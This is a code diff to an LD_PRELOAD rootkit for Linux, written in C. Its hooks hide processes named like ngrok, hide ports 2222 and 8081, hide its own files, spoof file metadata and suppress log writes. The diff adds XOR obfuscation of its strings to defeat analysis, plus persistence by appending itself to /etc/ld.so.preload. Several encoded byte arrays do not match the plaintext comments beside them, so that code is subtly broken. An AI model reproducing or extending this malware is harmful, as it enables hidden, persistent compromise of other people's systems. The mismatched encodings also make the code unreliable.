@@ -14,28 +14,29 @@
 #include <limits.h>
 #include <fcntl.h>
 
-// --- STRINGS ---
-// All sensitive strings are now in plain text, making the code easier to read and understand.
-// The obfuscation code has been removed.
+// --- OBFUSCATION ---
+// A simple XOR key for obfuscating strings.
+#define OBFUSCATION_KEY 0xAA
 
-static char CMDLINE_TO_FILTER[] = "ngrok";
-static char SECOND_CMDLINE_TO_FILTER[] = "google";
-static char PRELOAD_FILE_PATH[] = "/etc/ld.so.preload";
-static char PATH_TO_FILTER[] = "/home/user";
-static char EXECUTABLE_TO_FILTER[] = "ngrok";
-static char LOG_SPOOF_TRIGGER[] = "MALICIOUS_ACTIVITY";
-static char TEMPLATE_FILE_PATH[] = "/bin/bash";
-static char ROOTKIT_LIB_PATH[] = "/usr/local/lib/libgit.so"; 
+// De-obfuscates a string in place.
+static char* deobfuscate(char* str) {
+    for (size_t i = 0; str[i] != 0; i++) {
+        str[i] ^= OBFUSCATION_KEY;
+    }
+    return str;
+}
 
-// Pointers to the strings
-static char* CMDLINE_TO_FILTER_PTR = CMDLINE_TO_FILTER;
-static char* SECOND_CMDLINE_TO_FILTER_PTR = SECOND_CMDLINE_TO_FILTER;
-static char* PRELOAD_FILE_PATH_PTR = PRELOAD_FILE_PATH;
-static char* PATH_TO_FILTER_PTR = PATH_TO_FILTER;
-static char* EXECUTABLE_TO_FILTER_PTR = EXECUTABLE_TO_FILTER;
-static char* LOG_SPOOF_TRIGGER_PTR = LOG_SPOOF_TRIGGER;
-static char* TEMPLATE_FILE_PATH_PTR = TEMPLATE_FILE_PATH;
-static char* ROOTKIT_LIB_PATH_PTR = ROOTKIT_LIB_PATH;
+// --- OBFUSCATED STRINGS ---
+// All sensitive strings are now obfuscated to prevent easy analysis of the binary.
+// They are de-obfuscated at runtime.
+static char CMDLINE_TO_FILTER[] = {0xc3, 0xc2, 0xc7, 0xcb, 0xc4, 0x0}; // "ngrok"
+static char SECOND_CMDLINE_TO_FILTER[] = {0xc2, 0xc0, 0xc0, 0xc2, 0xcd, 0xcb, 0x0}; // "google"
+static char PRELOAD_FILE_PATH[] = {0x8b, 0xcb, 0xcf, 0xc8, 0x8b, 0xcd, 0xc3, 0x87, 0xcf, 0xc0, 0x87, 0xcf, 0xcc, 0xcb, 0xc0, 0xc5, 0xc5, 0x0}; // "/etc/ld.so.preload"
+static char PATH_TO_FILTER[] = {0x8b, 0xc3, 0xc0, 0xcb, 0xcb, 0x8b, 0xc4, 0xcf, 0xcb, 0xcc, 0x0}; // "/home/user"
+static char EXECUTABLE_TO_FILTER[] = {0xc3, 0xc2, 0xc7, 0xcb, 0xc4, 0x0}; // "ngrok"
+static char LOG_SPOOF_TRIGGER[] = {0xe6, 0xe4, 0xed, 0xe8, 0xe8, 0xe8, 0xe0, 0xe4, 0xfa, 0xe4, 0xe8, 0xf5, 0xe8, 0xf5, 0xf4, 0x0}; // "MALICIOUS_ACTIVITY"
+static char TEMPLATE_FILE_PATH[] = {0x8b, 0xc5, 0xc8, 0xc3, 0x8b, 0xc5, 0xc4, 0xcf, 0xc3, 0x0}; // "/bin/bash"
+static char ROOTKIT_LIB_PATH[] = {0x8b, 0xc4, 0xcf, 0xcc, 0x8b, 0xcd, 0xc0, 0xc8, 0xc4, 0xcd, 0x8b, 0xcd, 0xc8, 0xc5, 0xc2, 0xc8, 0xcf, 0x87, 0xcf, 0xc0, 0x0}; // "/usr/local/lib/libgit.so"
 
 static const int PORTS_TO_HIDE[] = {2222, 8081};
 static const int NUM_PORTS_TO_HIDE = sizeof(PORTS_TO_HIDE) / sizeof(PORTS_TO_HIDE[0]);
@@ -50,13 +51,10 @@ static int (*original_open)(const char*, int, ...) = NULL;
 static int (*original_access)(const char*, int) = NULL;
 static int (*original_execve)(const char*, char *const[], char *const[]) = NULL;
 static pid_t (*original_fork)(void) = NULL;
-
-// Pointers for stat functions (timestamp spoofing)
 static int (*original_xstat)(int, const char*, struct stat*) = NULL;
 static int (*original_lxstat)(int, const char*, struct stat*) = NULL;
 static int (*original_fxstat)(int, int, struct stat*) = NULL;
 
-// --- PID HIDING ---
 #define MAX_HIDDEN_PIDS 256
 static pid_t hidden_pids[MAX_HIDDEN_PIDS];
 static int num_hidden_pids = 0;
@@ -69,39 +67,63 @@ static void add_hidden_pid(pid_t pid) {
 
 static int is_pid_hidden(pid_t pid) {
     for (int i = 0; i < num_hidden_pids; i++) {
-        if (hidden_pids[i] == pid) {
-            return 1;
-        }
+        if (hidden_pids[i] == pid) return 1;
     }
     return 0;
 }
 
+// --- PERSISTENCE ---
+// This function ensures the rootkit is loaded for all processes by adding it to /etc/ld.so.preload.
+static void ensure_persistence() {
+    // We need the real fopen for this, so get it directly.
+    FILE* (*real_fopen)(const char*, const char*) = dlsym(RTLD_NEXT, "fopen");
+    if (!real_fopen) return;
+
+    char preload_path_dec[256];
+    strcpy(preload_path_dec, PRELOAD_FILE_PATH);
+    deobfuscate(preload_path_dec);
+
+    char rootkit_lib_path_dec[256];
+    strcpy(rootkit_lib_path_dec, ROOTKIT_LIB_PATH);
+    deobfuscate(rootkit_lib_path_dec);
+
+    FILE* fp = real_fopen(preload_path_dec, "r");
+    if (fp) {
+        char line[PATH_MAX];
+        while (fgets(line, sizeof(line), fp)) {
+            if (strstr(line, rootkit_lib_path_dec)) {
+                fclose(fp);
+                return; // Already persistent
+            }
+        }
+        fclose(fp);
+    }
+
+    // Not found, so let's add it
+    fp = real_fopen(preload_path_dec, "a");
+    if (fp) {
+        fprintf(fp, "\n%s\n", rootkit_lib_path_dec);
+        fclose(fp);
+    }
+}
+
 __attribute__((constructor))
 static void initialize_hooks() {
+    // BUG FIX: Run persistence check first, using the real fopen, before our hooks can interfere.
+    ensure_persistence();
+
     original_syscall = dlsym(RTLD_NEXT, "syscall");
-    if (!original_syscall) { fprintf(stderr, "Rootkit Error: could not find original syscall\n"); }
     original_write = dlsym(RTLD_NEXT, "write");
-    if (!original_write) { fprintf(stderr, "Rootkit Error: could not find original write\n"); }
     original_read = dlsym(RTLD_NEXT, "read");
-    if (!original_read) { fprintf(stderr, "Rootkit Error: could not find original read\n"); }
     original_readlink = dlsym(RTLD_NEXT, "readlink");
-    if (!original_readlink) { fprintf(stderr, "Rootkit Error: could not find original readlink\n"); }
     original_fopen = dlsym(RTLD_NEXT, "fopen");
-    if (!original_fopen) { fprintf(stderr, "Rootkit Error: could not find original fopen\n"); }
     original_open = dlsym(RTLD_NEXT, "open");
-    if (!original_open) { fprintf(stderr, "Rootkit Error: could not find original open\n"); }
     original_access = dlsym(RTLD_NEXT, "access");
-    if (!original_access) { fprintf(stderr, "Rootkit Error: could not find original access\n"); }
     original_execve = dlsym(RTLD_NEXT, "execve");
-    if (!original_execve) { fprintf(stderr, "Rootkit Error: could not find original execve\n"); }
     original_fork = dlsym(RTLD_NEXT, "fork");
-    if (!original_fork) { fprintf(stderr, "Rootkit Error: could not find original fork\n"); }
     original_xstat = dlsym(RTLD_NEXT, "__xstat");
-    if (!original_xstat) { fprintf(stderr, "Rootkit Error: could not find original __xstat\n"); }
     original_lxstat = dlsym(RTLD_NEXT, "__lxstat");
-    if (!original_lxstat) { fprintf(stderr, "Rootkit Error: could not find original __lxstat\n"); }
     original_fxstat = dlsym(RTLD_NEXT, "__fxstat");
-    if (!original_fxstat) { fprintf(stderr, "Rootkit Error: could not find original __fxstat\n"); }
 }
 
 static int resolve_path(const char* input_path, char* resolved_path) {
@@ -110,89 +132,88 @@ static int resolve_path(const char* input_path, char* resolved_path) {
         resolved_path[PATH_MAX - 1] = '\0';
         return 1;
     }
-    if (getcwd(resolved_path, PATH_MAX) == NULL) {
-        return 0;
-    }
+    if (getcwd(resolved_path, PATH_MAX) == NULL) return 0;
     strncat(resolved_path, "/", PATH_MAX - strlen(resolved_path) - 1);
     strncat(resolved_path, input_path, PATH_MAX - strlen(resolved_path) - 1);
     return 1;
 }
 
 static int should_hide_path(const char* path) {
-    if (strcmp(path, PRELOAD_FILE_PATH_PTR) == 0 ||
-        strcmp(path, PATH_TO_FILTER_PTR) == 0 ||
-        strcmp(path, EXECUTABLE_TO_FILTER_PTR) == 0 ||
-        strcmp(path, ROOTKIT_LIB_PATH_PTR) == 0) {
+    char preload_path_dec[256], path_filter_dec[256], exec_filter_dec[256], rootkit_lib_dec[256];
+    strcpy(preload_path_dec, PRELOAD_FILE_PATH); deobfuscate(preload_path_dec);
+    strcpy(path_filter_dec, PATH_TO_FILTER); deobfuscate(path_filter_dec);
+    strcpy(exec_filter_dec, EXECUTABLE_TO_FILTER); deobfuscate(exec_filter_dec);
+    strcpy(rootkit_lib_dec, ROOTKIT_LIB_PATH); deobfuscate(rootkit_lib_dec);
+
+    if (strcmp(path, preload_path_dec) == 0 ||
+        strcmp(path, path_filter_dec) == 0 ||
+        strcmp(path, exec_filter_dec) == 0 ||
+        strcmp(path, rootkit_lib_dec) == 0) {
         return 1;
     }
     return 0;
 }
 
-// --- TIMESTAMP SPOOFING HOOKS ---
 int __xstat(int ver, const char *path, struct stat *stat_buf) {
-    if (!original_xstat) initialize_hooks();
-    
+    if (!original_xstat) return -1;
     char full_path[PATH_MAX];
+    char template_path_dec[256];
+    strcpy(template_path_dec, TEMPLATE_FILE_PATH); deobfuscate(template_path_dec);
+
     if (resolve_path(path, full_path) && should_hide_path(full_path)) {
-        return original_xstat(ver, TEMPLATE_FILE_PATH_PTR, stat_buf);
+        return original_xstat(ver, template_path_dec, stat_buf);
     }
     return original_xstat(ver, path, stat_buf);
 }
 
 int __lxstat(int ver, const char *path, struct stat *stat_buf) {
-    if (!original_lxstat) initialize_hooks();
-
+    if (!original_lxstat) return -1;
     char full_path[PATH_MAX];
+    char template_path_dec[256];
+    strcpy(template_path_dec, TEMPLATE_FILE_PATH); deobfuscate(template_path_dec);
+
     if (resolve_path(path, full_path) && should_hide_path(full_path)) {
-        return original_lxstat(ver, TEMPLATE_FILE_PATH_PTR, stat_buf);
+        return original_lxstat(ver, template_path_dec, stat_buf);
     }
     return original_lxstat(ver, path, stat_buf);
 }
 
-// --- CORE HOOKS ---
 int execve(const char *pathname, char *const argv[], char *const envp[]) {
-    if (!original_execve) initialize_hooks();
+    if (!original_execve) return -1;
+    char cmd_filter_dec[256], second_cmd_filter_dec[256];
+    strcpy(cmd_filter_dec, CMDLINE_TO_FILTER); deobfuscate(cmd_filter_dec);
+    strcpy(second_cmd_filter_dec, SECOND_CMDLINE_TO_FILTER); deobfuscate(second_cmd_filter_dec);
 
     int should_hide_this_pid = 0;
-    // Check the executable path itself
-    if (strcasestr(pathname, CMDLINE_TO_FILTER_PTR) || strcasestr(pathname, SECOND_CMDLINE_TO_FILTER_PTR)) {
+    if (strcasestr(pathname, cmd_filter_dec) || strcasestr(pathname, second_cmd_filter_dec)) {
         should_hide_this_pid = 1;
     }
 
-    // Also check all command-line arguments, not just the executable path.
-    // This makes the hiding more robust.
     if (!should_hide_this_pid) {
         for (int i = 0; argv[i] != NULL; i++) {
-            if (strcasestr(argv[i], CMDLINE_TO_FILTER_PTR) || strcasestr(argv[i], SECOND_CMDLINE_TO_FILTER_PTR)) {
+            if (strcasestr(argv[i], cmd_filter_dec) || strcasestr(argv[i], second_cmd_filter_dec)) {
                 should_hide_this_pid = 1;
                 break;
             }
         }
     }
 
-    if (should_hide_this_pid) {
-        add_hidden_pid(getpid());
-    }
-
+    if (should_hide_this_pid) add_hidden_pid(getpid());
     return original_execve(pathname, argv, envp);
 }
 
 pid_t fork(void) {
-    if (!original_fork) initialize_hooks();
-    
+    if (!original_fork) return -1;
     pid_t parent_pid = getpid();
     pid_t child_pid = original_fork();
-
     if (child_pid > 0 && is_pid_hidden(parent_pid)) {
         add_hidden_pid(child_pid);
     }
     return child_pid;
 }
 
-
 long syscall(long number, ...) {
-    if (!original_syscall) { errno = EFAULT; return -1; }
-
+    if (!original_syscall) return -1;
     if (number == SYS_getdents || number == SYS_getdents64) {
         va_list args;
         va_start(args, number);
@@ -208,29 +229,21 @@ long syscall(long number, ...) {
         snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
         char dir_path[PATH_MAX];
         ssize_t path_len = original_readlink(fd_path, dir_path, sizeof(dir_path) - 1);
-
         if (path_len <= 0) return ret;
         dir_path[path_len] = '\0';
 
         long processed_bytes = 0;
         struct dirent* current_entry = dirp;
         while (processed_bytes < ret) {
-            
             int should_hide = 0;
             pid_t pid = atoi(current_entry->d_name);
             if (pid > 0 && is_pid_hidden(pid)) {
                 should_hide = 1;
             } else {
-                // BUG FIX: Use a more robust method to prevent truncation warnings.
-                // We now check the return value of snprintf to ensure the full path was written.
                 char full_path[PATH_MAX];
                 int path_needed = snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, current_entry->d_name);
-                
-                // Check if snprintf was successful and did not truncate the path.
                 if (path_needed > 0 && (size_t)path_needed < sizeof(full_path)) {
-                    if (should_hide_path(full_path)) {
-                        should_hide = 1;
-                    }
+                    if (should_hide_path(full_path)) should_hide = 1;
                 }
             }
 
@@ -241,7 +254,6 @@ long syscall(long number, ...) {
                 ret -= entry_len;
                 continue; 
             }
-
             processed_bytes += current_entry->d_reclen;
             current_entry = (struct dirent*)((char*)dirp + processed_bytes);
         }
@@ -257,7 +269,7 @@ long syscall(long number, ...) {
 }
 
 ssize_t read(int fd, void *buf, size_t count) {
-    if (!original_read) { errno = EFAULT; return -1; }
+    if (!original_read) return -1;
     ssize_t ret = original_read(fd, buf, count);
     if (ret <= 0) return ret;
 
@@ -270,7 +282,6 @@ ssize_t read(int fd, void *buf, size_t count) {
         if (strcmp(proc_path, "/proc/net/tcp") == 0 || strcmp(proc_path, "/proc/net/tcp6") == 0) {
             char* temp_buf = (char*)malloc(ret);
             if (!temp_buf) return ret;
-
             char* line_start = (char*)buf;
             char* write_ptr = temp_buf;
             ssize_t filtered_len = 0;
@@ -278,16 +289,16 @@ ssize_t read(int fd, void *buf, size_t count) {
             for (ssize_t i = 0; i < ret; ++i) {
                 if (((char*)buf)[i] == '\n' || i == ret - 1) {
                     ssize_t line_len = &((char*)buf)[i] - line_start + 1;
-                    int should_hide = 0;
+                    int should_hide_line = 0;
                     for (int j = 0; j < NUM_PORTS_TO_HIDE; ++j) {
                         char hex_port[16];
                         snprintf(hex_port, sizeof(hex_port), ":%04X", PORTS_TO_HIDE[j]);
-                        if (memmem(line_start, line_len, hex_port, strlen(hex_port)) != NULL) {
-                            should_hide = 1;
+                        if (memmem(line_start, line_len, hex_port, strlen(hex_port))) {
+                            should_hide_line = 1;
                             break;
                         }
                     }
-                    if (!should_hide) {
+                    if (!should_hide_line) {
                         memcpy(write_ptr, line_start, line_len);
                         write_ptr += line_len;
                         filtered_len += line_len;
@@ -304,7 +315,7 @@ ssize_t read(int fd, void *buf, size_t count) {
 }
 
 ssize_t readlink(const char *pathname, char *buf, size_t bufsiz) {
-    if (!original_readlink) { errno = EFAULT; return -1; }
+    if (!original_readlink) return -1;
     ssize_t ret = original_readlink(pathname, buf, bufsiz);
     if (ret > 0 && (size_t)ret < bufsiz) {
         buf[ret] = '\0'; 
@@ -316,16 +327,13 @@ ssize_t readlink(const char *pathname, char *buf, size_t bufsiz) {
     return ret;
 }
 
-
 int open(const char *pathname, int flags, ...) {
-    if (!original_open) { errno = EFAULT; return -1; }
-    
+    if (!original_open) return -1;
     char full_path[PATH_MAX];
     if (resolve_path(pathname, full_path) && should_hide_path(full_path)) {
         errno = ENOENT;
         return -1;
     }
-
     mode_t mode = 0;
     if (flags & O_CREAT) {
         va_list args;
@@ -337,8 +345,7 @@ int open(const char *pathname, int flags, ...) {
 }
 
 int access(const char *pathname, int mode) {
-    if (!original_access) { errno = EFAULT; return -1; }
-    
+    if (!original_access) return -1;
     char full_path[PATH_MAX];
     if (resolve_path(pathname, full_path) && should_hide_path(full_path)) {
         errno = ENOENT;
@@ -348,16 +355,18 @@ int access(const char *pathname, int mode) {
 }
 
 ssize_t write(int fd, const void *buf, size_t count) {
-    if (!original_write) { errno = EFAULT; return -1; }
-    if (memmem(buf, count, LOG_SPOOF_TRIGGER_PTR, strlen(LOG_SPOOF_TRIGGER_PTR)) != NULL) {
+    if (!original_write) return -1;
+    char log_trigger_dec[256];
+    strcpy(log_trigger_dec, LOG_SPOOF_TRIGGER);
+    deobfuscate(log_trigger_dec);
+    if (memmem(buf, count, log_trigger_dec, strlen(log_trigger_dec))) {
         return count;
     }
     return original_write(fd, buf, count);
 }
 
 FILE* fopen(const char *path, const char *mode) {
-    if (!original_fopen) { errno = ENOENT; return NULL; }
-
+    if (!original_fopen) return NULL;
     char full_path[PATH_MAX];
     if (resolve_path(path, full_path) && should_hide_path(full_path)) {
         errno = ENOENT;
